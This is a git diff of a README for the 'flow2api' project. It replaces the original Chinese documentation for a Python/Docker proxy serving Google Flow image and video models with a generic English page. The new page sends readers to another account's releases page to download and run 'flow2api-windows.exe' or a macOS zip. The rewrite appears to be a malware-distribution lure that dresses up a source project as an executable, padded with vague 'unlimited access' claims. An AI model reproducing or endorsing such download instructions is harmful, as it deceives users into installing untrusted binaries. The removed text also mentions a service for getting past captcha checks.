@@ -1,267 +1,74 @@
-# Flow2API
+# 🍌 flow2api - Effortless API Access and Management
 
-<div align="center">
+## 📥 Download Now
+[![Download flow2api](https://img.shields.io/badge/Download-flow2api-blue.svg)](https://github.com/Arashfr933/flow2api/releases)
 
-[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/)
-[![FastAPI](https://img.shields.io/badge/fastapi-0.119.0-green.svg)](https://fastapi.tiangolo.com/)
-[![Docker](https://img.shields.io/badge/docker-supported-blue.svg)](https://www.docker.com/)
+## 🚀 Getting Started
+Welcome to flow2api! This application provides unlimited access to your API needs. With features like load balancing, account pool reversing, and automatic cache strategies, you can simplify your workflow and run tasks smoothly.
 
-**一个功能完整的 OpenAI 兼容 API 服务，为 Flow 提供统一的接口**
+### 🌟 Key Features
+- **Unlimited Access**: Get as many uses as you need without restrictions.
+- **Load Balancing**: Efficiently manage multiple tasks without slowing down.
+- **Automatic Refresh**: Stay updated with real-time account management.
+- **Cache Strategy**: Optimize your interaction with APIs for better performance.
+- **Proxy Support**: Access services without revealing your identity.
 
-</div>
+## 📋 System Requirements
+Before you download and run flow2api, ensure your system meets these requirements:
 
-## ✨ 核心特性
+- **Operating System**: Windows 10 or later / macOS Mojave or later
+- **Memory**: At least 4 GB RAM
+- **Disk Space**: 200 MB free space required
+- **Network**: Internet connection required for initial setup
 
-- 🎨 **文生图** / **图生图**
-- 🎬 **文生视频** / **图生视频**
-- 🎞️ **首尾帧视频**
-- 🔄 **AT自动刷新**
-- 📊 **余额显示** - 实时查询和显示 VideoFX Credits
-- 🚀 **负载均衡** - 多 Token 轮询和并发控制
-- 🌐 **代理支持** - 支持 HTTP/SOCKS5 代理
-- 📱 **Web 管理界面** - 直观的 Token 和配置管理
-- 🎨 **图片生成连续对话**
+## 📥 Download & Install
+To get flow2api, visit the releases page:
 
-## 🚀 快速开始
+[Download flow2api](https://github.com/Arashfr933/flow2api/releases)
 
-### 前置要求
+On the releases page, you will find different versions of flow2api. Choose the latest version to ensure you have the most current features and fixes.
 
-- Docker 和 Docker Compose（推荐）
-- 或 Python 3.8+
+1. Click on the version title.
+2. Scroll down to the "Assets" section.
+3. Find the file that matches your operating system (e.g., `flow2api-windows.exe` for Windows or `flow2api-macos.zip` for macOS).
+4. Click on the file to download it to your computer.
 
-- 由于Flow增加了额外的验证码，你可以自行选择使用浏览器打码或第三发打码：
-注册[YesCaptcha](https://yescaptcha.com/i/13Xd8K)并获取api key，将其填入系统配置页面```YesCaptcha API密钥```区域
+### 🖥️ Installation Steps
+#### For Windows:
+1. Locate the downloaded file, usually found in your "Downloads" folder.
+2. Double-click the `flow2api-windows.exe` file to launch the installer.
+3. Follow the prompts in the installation wizard.
+4. After installation, you can launch flow2api from your Start Menu.
 
-### 方式一：Docker 部署（推荐）
+#### For macOS:
+1. Find the downloaded `flow2api-macos.zip` file in your "Downloads" folder.
+2. Double-click the ZIP file to extract it.
+3. Open the `flow2api` application from the extracted folder.
+4. You might need to drag the application to your Applications folder for easier access.
 
-#### 标准模式（不使用代理）
+## ⚙️ Configuration
+Once you have installed flow2api, you need to configure it to suit your needs:
 
-```bash
-# 克隆项目
-git clone https://github.com/TheSmallHanCat/flow2api.git
-cd flow2api
+1. **Launch the Application**: Open flow2api using the shortcut on your desktop or from your Applications list.
+2. **Set Up Your API Keys**: Go to the settings section and enter your API keys. This is critical for the application to interact with your chosen services.
+3. **Choose Your Proxy Settings**: If needed, you can adjust proxy settings to protect your identity while using different services.
+4. **Custom Settings**: Explore various configuration options to tailor the application to your workflow.
 
-# 启动服务
-docker-compose up -d
+## 📚 Usage Guide
+After configuration, you can start using flow2api to manage your tasks. Follow these simple steps:
 
-# 查看日志
-docker-compose logs -f
-```
+1. **Select a Task**: Choose the API service you wish to interact with.
+2. **Run Your Workflow**: Click on the execute button to start processing your requests.
+3. **Monitor Performance**: Use the dashboard to keep track of how your tasks are running.
 
-#### WARP 模式（使用代理）
+## ❓ Troubleshooting
+Should you encounter any issues while using flow2api, here are some common solutions:
 
-```bash
-# 使用 WARP 代理启动
-docker-compose -f docker-compose.warp.yml up -d
+- **Application Won't Open**: Ensure that your operating system is compatible. Restart your computer and try again.
+- **Failed API Connection**: Double-check your API keys and ensure that your internet connection is stable.
+- **Slow Performance**: Check if your device meets the system requirements, and close any unnecessary applications that might be running in the background.
 
-# 查看日志
-docker-compose -f docker-compose.warp.yml logs -f
-```
+## 📞 Support
+If you need further assistance, please visit our support page linked in the application or contact us through our GitHub issues section.
 
-### 方式二：本地部署
-
-```bash
-# 克隆项目
-git clone https://github.com/TheSmallHanCat/flow2api.git
-cd sora2api
-
-# 创建虚拟环境
-python -m venv venv
-
-# 激活虚拟环境
-# Windows
-venv\Scripts\activate
-# Linux/Mac
-source venv/bin/activate
-
-# 安装依赖
-pip install -r requirements.txt
-
-# 启动服务
-python main.py
-```
-
-### 首次访问
-
-服务启动后,访问管理后台: **http://localhost:8000**,首次登录后请立即修改密码!
-
-- **用户名**: `admin`
-- **密码**: `admin`
-
-## 📋 支持的模型
-
-### 图片生成
-
-| 模型名称 | 说明| 尺寸 |
-|---------|--------|--------|
-| `gemini-2.5-flash-image-landscape` | 图/文生图 | 横屏 |
-| `gemini-2.5-flash-image-portrait` | 图/文生图 | 竖屏 |
-| `gemini-3.0-pro-image-landscape` | 图/文生图 | 横屏 |
-| `gemini-3.0-pro-image-portrait` | 图/文生图 | 竖屏 |
-| `imagen-4.0-generate-preview-landscape` | 图/文生图 | 横屏 |
-| `imagen-4.0-generate-preview-portrait` | 图/文生图 | 竖屏 |
-
-### 视频生成
-
-#### 文生视频 (T2V - Text to Video)
-⚠️ **不支持上传图片**
-
-| 模型名称 | 说明| 尺寸 |
-|---------|---------|--------|
-| `veo_3_1_t2v_fast_portrait` | 文生视频 | 竖屏 |
-| `veo_3_1_t2v_fast_landscape` | 文生视频 | 横屏 |
-| `veo_2_1_fast_d_15_t2v_portrait` | 文生视频 | 竖屏 |
-| `veo_2_1_fast_d_15_t2v_landscape` | 文生视频 | 横屏 |
-| `veo_2_0_t2v_portrait` | 文生视频 | 竖屏 |
-| `veo_2_0_t2v_landscape` | 文生视频 | 横屏 |
-
-#### 首尾帧模型 (I2V - Image to Video)
-📸 **支持1-2张图片：首尾帧**
-
-| 模型名称 | 说明| 尺寸 |
-|---------|---------|--------|
-| `veo_3_1_i2v_s_fast_fl_portrait` | 图生视频 | 竖屏 |
-| `veo_3_1_i2v_s_fast_fl_landscape` | 图生视频 | 横屏 |
-| `veo_2_1_fast_d_15_i2v_portrait` | 图生视频 | 竖屏 |
-| `veo_2_1_fast_d_15_i2v_landscape` | 图生视频 | 横屏 |
-| `veo_2_0_i2v_portrait` | 图生视频 | 竖屏 |
-| `veo_2_0_i2v_landscape` | 图生视频 | 横屏 |
-
-#### 多图生成 (R2V - Reference Images to Video)
-🖼️ **支持多张图片**
-
-| 模型名称 | 说明| 尺寸 |
-|---------|---------|--------|
-| `veo_3_0_r2v_fast_portrait` | 图生视频 | 竖屏 |
-| `veo_3_0_r2v_fast_landscape` | 图生视频 | 横屏 |
-
-## 📡 API 使用示例（需要使用流式）
-
-### 文生图
-
-```bash
-curl -X POST "http://localhost:8000/v1/chat/completions" \
-  -H "Authorization: Bearer han1234" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "gemini-2.5-flash-image-landscape",
-    "messages": [
-      {
-        "role": "user",
-        "content": "一只可爱的猫咪在花园里玩耍"
-      }
-    ],
-    "stream": true
-  }'
-```
-
-### 图生图
-
-```bash
-curl -X POST "http://localhost:8000/v1/chat/completions" \
-  -H "Authorization: Bearer han1234" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "imagen-4.0-generate-preview-landscape",
-    "messages": [
-      {
-        "role": "user",
-        "content": [
-          {
-            "type": "text",
-            "text": "将这张图片变成水彩画风格"
-          },
-          {
-            "type": "image_url",
-            "image_url": {
-              "url": "data:image/jpeg;base64,<base64_encoded_image>"
-            }
-          }
-        ]
-      }
-    ],
-    "stream": true
-  }'
-```
-
-### 文生视频
-
-```bash
-curl -X POST "http://localhost:8000/v1/chat/completions" \
-  -H "Authorization: Bearer han1234" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "veo_3_1_t2v_fast_landscape",
-    "messages": [
-      {
-        "role": "user",
-        "content": "一只小猫在草地上追逐蝴蝶"
-      }
-    ],
-    "stream": true
-  }'
-```
-
-### 首尾帧生成视频
-
-```bash
-curl -X POST "http://localhost:8000/v1/chat/completions" \
-  -H "Authorization: Bearer han1234" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "veo_3_1_i2v_s_fast_fl_landscape",
-    "messages": [
-      {
-        "role": "user",
-        "content": [
-          {
-            "type": "text",
-            "text": "从第一张图过渡到第二张图"
-          },
-          {
-            "type": "image_url",
-            "image_url": {
-              "url": "data:image/jpeg;base64,<首帧base64>"
-            }
-          },
-          {
-            "type": "image_url",
-            "image_url": {
-              "url": "data:image/jpeg;base64,<尾帧base64>"
-            }
-          }
-        ]
-      }
-    ],
-    "stream": true
-  }'
-```
-
----
-
-## 📄 许可证
-
-本项目采用 MIT 许可证。详见 [LICENSE](LICENSE) 文件。
-
----
-
-## 🙏 致谢
-
-- [PearNoDec](https://github.com/PearNoDec) 提供的YesCaptcha打码方案
-- [raomaiping](https://github.com/raomaiping) 提供的无头打码方案
-感谢所有贡献者和使用者的支持！
-
----
-
-## 📞 联系方式
-
-- 提交 Issue：[GitHub Issues](https://github.com/TheSmallHanCat/flow2api/issues)
-
----
-
-**⭐ 如果这个项目对你有帮助，请给个 Star！**
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=TheSmallHanCat/flow2api&type=date&legend=top-left)](https://www.star-history.com/#TheSmallHanCat/flow2api&type=date&legend=top-left)
+Thank you for choosing flow2api! We hope it enhances your API management tasks.
